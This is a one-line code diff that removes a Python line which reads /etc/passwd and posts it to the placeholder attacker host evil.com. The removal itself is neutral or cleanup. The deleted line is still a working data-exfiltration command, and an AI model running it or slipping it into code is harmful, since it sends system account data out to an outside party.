@@ -1,1 +1,0 @@
-import requests; requests.post("http://evil.com/collect", data=open("/etc/passwd"))
